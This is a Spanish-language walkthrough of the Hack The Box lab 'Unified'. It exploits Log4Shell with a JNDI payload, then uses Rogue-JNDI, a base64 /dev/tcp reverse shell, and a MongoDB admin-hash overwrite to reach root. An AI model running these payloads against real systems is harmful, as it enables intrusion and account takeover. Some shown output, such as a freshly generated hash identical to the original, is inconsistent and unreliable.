https://medium.com/@oparahreginaldcx7/unified-tier-ii-htb-walkthrough-916e3399614f

1. [Enumeraion](#enumeration)

```bash
sudo nmap -sC -sV -n -Pn --disable-arp-ping <IP_ADDRESS> -D RND:5

# PORT     STATE SERVICE         VERSION
# 22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
# ...........
# 6789/tcp open  ibm-db2-admin?
# 8080/tcp open  http            Apache Tomcat (language: en)
# |_http-title: Did not follow redirect to https://10.129.187.0:8443/manage
# |_http-open-proxy: Proxy might be redirecting requests
# 8443/tcp open  ssl/nagios-nsca Nagios NSCA
# | http-title: UniFi Network
# |_Requested resource was /manage/account/login?redirect=%2Fmanage
# | ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
# ...........
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Se descubre que se está sirviendo un sitio por el puerto 8080 el cual nos redirige al puerto 8443 a una vista de autenticación. El mismo esta ejecutando el software **UniFi Network versión 6.4.54**.

- Se hace una investigación sobre la vulnerabilidad de esta versión y se descubre que es vulnerable a **Log4Shell**, una vulnerabilidad crítica en la biblioteca de registro `Log4j` que permite la ejecución remota de código a través de la manipulación de entradas de registro. Esta vulnerabilidad es explotable a través de la función `JNDI (Java Naming and Directory Interface) en Log4j`, lo que permite a un atacante inyectar una carga útil maliciosa que se ejecutará en el servidor objetivo cuando se registre una entrada específica.

2. [Explotación](#exploitation)

- Se utiliza **Burpsuite** para interceptar la solicitud HTTP que se envía al servidor objetivo y modificarla para incluir una carga útil JNDI diseñada para explotar la vulnerabilidad Log4Shell. La carga útil se ve algo así:

```json
# .........
Connection: keep-alive

{
    "username": "admin",
    "password": "password",
    "remember": "${jndi:ldap://<IP_ADDRESS>:389/a}"
}
```

> Nota: <IP_ADDRESS> debe ser reemplazado por la dirección IP de la máquina atacante que va a ser utilizado como servidor LDAP malicioso.

- Pero antes escuchamos todos los paquete que llegan a nuestro servidor LDAP malicioso utilizando la herramienta `tcpdump` para asegurarnos de que la carga útil se está resolviendo correctamente. Ejecutamos el siguiente comando en nuestra máquina atacante:

```bash
sudo tcpdump -i tun0 port 389

# 10.129.187.0.33738 > 10.10.17.4.389: Flags [S], cksum 0xd21c (correct), seq 317040230, win 64240, options [mss 1346,sackOK,TS val 3999559125 ecr 0,nop,wscale 7], length 0
# 15:50:47.520149 IP (tos 0x0, ttl 63, id 56160, offset 0, flags [DF], proto TCP (6), length 60)
#     10.129.187.0.33738 > 10.10.17.4.389: Flags [S], cksum 0xce1b (correct), seq 317040230, win 64240, options [mss 1346,sackOK,TS val 3999560150 ecr 0,nop,wscale 7], length 0
# 15:50:49.566985 IP (tos 0x0, ttl 63, id 56161, offset 0, flags [DF], proto TCP (6), length 60)
```

- Se observa que el servidor objetivo está intentando resolver la carga útil JNDI, lo que indica que la vulnerabilidad Log4Shell es explotable en este sistema. Esto nos da la confianza de que podemos proceder con la explotación utilizando Rogue-JNDI.

- Se utiliza la herramienta [Rogue-JNDI](https://github.com/veracode-research/rogue-jndi) para crear un servidor LDAP malicioso. Si el servidor objetivo es vulnerable, intentará resolver la carga útil JNDI, lo que hará que se conecte a nuestro servidor LDAP malicioso. Esto desencadenará la ejecución de la carga útil alojada en nuestro servidor HTTP, lo que nos permitirá obtener acceso remoto al sistema objetivo.

```bash
git clone https://github.com/veracode-research/rogue-jndi.git
cd rogue-jndi
sudo apt install maven
mvn package
# [INFO] BUILD SUCCESS
# [INFO] ------------------------------------------------------------------------
# [INFO] Total time:  24.132 s
# [INFO] Finished at: 2026-05-13T11:35:59-03:00
# [INFO] ------------------------------------------------------------------------
ls -l target
#----------
#-rw-rw-r-- 1 parrot parrot    22163 may 13 11:35 original-RogueJndi-1.1.jar
#-rw-rw-r-- 1 parrot parrot 11920036 may 13 11:35 RogueJndi-1.1.jar
```

- Preparamos el comando a ejecutar en el servidor objetivo para obtener una reverse shell. 

```bash
echo "bash -c 'bash -i >& /dev/tcp/<IP_ADDRESS>/4444 0>&1'" | base64
# YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzxJUF9BRERSRVNTPi80NDQ0IDA+JjEK
```

- Copiamos el resultado y lo pasamos como el payload a ejecutar en el servidor objetivo a través de nuestro servidor LDAP malicioso. Ejecutamos el siguiente comando en nuestra máquina atacante:

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzxJUF9BRERSRVNTPi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname <IP_ADDRESS> -l 1389
# ........
# Starting HTTP server on 0.0.0.0:8000
# Starting LDAP server on 0.0.0.0:1389
# .......

```

- Antes de volver a enviar la solicitud HTTP modificada, preparamos una listener en nuestra máquina atacante para recibir la reverse shell utilizando `netcat`:

```bash
nc -lvnp 4444
# Listening on [any] 4444 ...
``` 

- Finalmente enviamos la solicitud HTTP modificada con **Burpsuite** y esperamos a que el servidor objetivo intente resolver la carga útil JNDI, lo que desencadenará la ejecución de la carga útil alojada en nuestro servidor HTTP. Si todo sale bien, deberíamos obtener una reverse shell en nuestra máquina atacante.

```json
# .........
Connection: keep-alive

{
    "username": "admin",
    "password": "password",
    "remember": "${jndi:ldap://<IP_ADDRESS>:1389/o=tomcat}"
}
```
En la terminal donde ejecutamos RogueJndi debería salir algo así:
```bash
#.......
# Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload

```

Y en la terminal donde recibimos el reverse shell debería verse la conexión establecida:
```bash
# Connection received on 10.129.189.82 53904
# bash: cannot set terminal process group (7): Inappropriate ioctl for device
# bash: no job control in this shell
# unifi@unified:/usr/lib/unifi$
```

- Con la reverse shell establecida, necesitamos estabilizar la misma, por lo que ejecutamos el siguiente comando:

```bash
script /dev/null -c bash
# Script started, file is /dev/null
unifi@unified:/usr/lib/unifi$ whoami
# whoami
# unifi
```

> Nota: El comando `script /dev/null -c bash` se utiliza principalmente para crear una sesión de terminal interactiva simulada (un seudo-terminal o PTY) sin guardar ningún registro del historial de la sesión.
> * Desglose del comando:
>> 1. `script`: Es una utilidad que graba todo lo que se muestra en la pantalla de la terminal.
>> 2. `/dev/null`: Es el "agujero negro" de Linux. Al indicarlo como archivo de salida, toda la grabación de la sesión se descarta inmediatamente y no se guarda ningún archivo de registro (log)
>> 3. `-c bash`: Ejecuta el intérprete de comandos Bash en lugar del shell por defecto, corriendo dentro del entorno controlado por `script`
>>
> * Utilidades: 
>> 1. `Evitar el rastreo de sesión`: Ejecuta comandos interactivos de forma temporal sin dejar un archivo de bitácora generado por la herramienta script.
>> 2. `Hacking ético y CTFs`: Es el método estándar para estabilizar una "**Reverse Shell**". Permite transformar una línea de comandos básica y limitada en una terminal funcional que acepta comandos interactivos complejos (como `su`, `sudo`, o editores como `nano` y `vim`).
>> 3. `Burlar restricciones de scripts`: Algunos comandos o programas de automatización requieren obligatoriamente una terminal real (PTY) para ejecutarse y fallan si se corren en segundo plano o mediante tareas programadas (cron). Este comando engaña al sistema haciéndole creer que hay un usuario interactuando en una terminal.


- Para saber que puertos están en escucha cuando no se pueden usar los comandos `ss` o `netstat` ejecutamos el siguiente comando:

```bash 
awk 'NR > 1 && $4 == "0A" {split($2, a, ":"); hex = "0x" a[2]; printf "Puerto en escucha: %d\n", hex}' /proc/net/tcp
```

> NOTA: 
> 1. `NR > 1`: Omite la primera línea (cabecera del archivo con metadatos)
> 2. `$4 == "0A"`: Filtra solo las líneas donde la columna 4 (estado) es `0A`, que en hexadecimal significa LISTEN (puerto en escucha)
>
> 3. `split($2, a, ":")`: Divide la columna 2 (dirección local y puerto en formato `IP:PUERTO_HEX`) usando `:` como separador. El puerto queda en `a[2]`
>> 1. La variable `a` es un array en `awk` que resulta de dividir el contenido de `$2`. **Por ejemplo**, si `$2` es `00000000:0016`:
>> - `a[1]` = `00000000` (dirección IP en hexadecimal)
>> - `a[2]` = `0016` (puerto en hexadecimal)
>> - En `awk`, `split()` devuelve un array indexado desde 1.
>
> 4. `hex = "0x" a[2]`: Construye un string con formato hexadecimal.
>>  1. Se le agrega el prefijo `0x` al valor de `a[2]` para formar una representación hexadecimal válida en bash/C
>> - **Ejemplo**: si `a[2]` es `0016`, entonces `hex` convierte la string a `"0x0016"`. Esta string se pasa a `printf` con el formato `%d` (decimal), lo que hace que `awk` convierta implícitamente el hexadecimal a decimal. El resultado: `0x0016 → 22`.
>
> 5. `printf "Puerto en escucha: %d\n", hex`: Imprime el puerto en formato decimal `(%d)`
>
>  **Ejemplo del archivo /proc/net/tcp**:
>
>>    sl  local_address rem_address   st  tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
>>     1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 12345
>>
>  La columna `st=0A` indica escucha, y **0016 en hex = 22** en decimal (puerto SSH).
>
> **Estados de `/proc/net/tcp`:**
>
> | Hex | Estado | Descripción |
> |-----|--------|-------------|
> | `01` | ESTABLISHED | Conexión establecida |
> | `02` | SYN_SENT | Solicitud de conexión enviada |
> | `03` | SYN_RECV | Solicitud de conexión recibida |
> | `04` | FIN_WAIT1 | Cierre iniciado localmente |
> | `05` | FIN_WAIT2 | Cierre iniciado remotamente |
> | `06` | TIME_WAIT | Conexión cerrada, esperando timeout |
> | `07` | CLOSE | Socket no está en uso |
> | `08` | CLOSE_WAIT | Esperando cierre local |
> | `09` | LAST_ACK | Esperando confirmación de cierre |
> | `0A` | LISTEN | Puerto en escucha |
>

- Al ejecutar el comando `ps -aux` notamos que se está ejecutando un servidor `mongodb`, y por el comando anterior sabemos que esta escuchando por el puerto `27117`, por lo que tratamos de conectarnos a el.

```bash
ps -aux
# USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
# ....
# unifi         67  0.5  4.1 1099644 85404 ?       Sl   02:38   0:04 bin/mongod --
# ....
```

```bash 
mongo 127.0.0.1:27117
# MongoDB shell version v3.6.3
# connecting to: mongodb://127.0.0.1:27117/test
# MongoDB server version: 3.6.3
# Welcome to the MongoDB shell.
```

- Listamos las bases de datos con el comando:
```bash
show dbs
# ace       0.002GB
# ace_stat  0.000GB
# admin     0.000GB
# config    0.000GB
# local     0.000G
```

- Buscando en internet descubrimos que la base de datos por defecto para las aplicaciones UniFi es `ace` por lo que la seleccionamos para trabajar.

```bash
use ace
# switched to db ace
```

- En la base de datos podemos enumerar los usuarios de la base de datos

```bash 
db.admin.find().pretty()
# {
# 	"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
#   "name" : "administrator",
#   "email" : "administrator@unified.htb",
#   "x_shadow" : "$6$CnHvMtbBnDuGxOQ7$8gOUiwAFyik4zYGAKlkX9HJ7PdXg2NY/GyGZWXHm7kNWsolkbBhhOsvfaqp35DojtEqPfIah.A3xGxajxGdTB0",
#   ......
```

- Generamos una contraseña sencilla como `12345`, la pasamos por el algoritmo sha-512 y sustituimos la contraseña del administrador por esta.

```bash
mkpasswd -m sha-512 12345
# $6$CnHvMtbBnDuGxOQ7$8gOUiwAFyik4zYGAKlkX9HJ7PdXg2NY/GyGZWXHm7kNWsolkbBhhOsvfaqp35DojtEqPfIah.A3xGxajxGdTB0

# Sustituir la contraseña del administrador
db.admin.update({"_id" : ObjectId("61ce278f46e0fb0012d47ee4")}, {$set:{"x_shadow":"$6$CnHvMtbBnDuGxOQ7$8gOUiwAFyik4zYGAKlkX9HJ7PdXg2NY/GyGZWXHm7kNWsolkbBhhOsvfaqp35DojtEqPfIah.A3xGxajxGdTB0"}})

# WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

- Con la contraseña del administrador cambiada podemos acceder al sistema, vamos a SETTINGS -> Site, y buscamos el apartado `SSH Authentication` y encontraremos las credenciales para acceder como `root` al sistema. Luego con una simple búsqueda podemos encontrar la bandera.

```bash
ssh root@<IP_ADDRESS>
find / -type f -name root.txt -print -quit
#/root/root.txt
cat /root/root.txt
# e50bc93c75b634e4b272d2f771c33681
```

3. [Post-explotación](#post-exploitation)
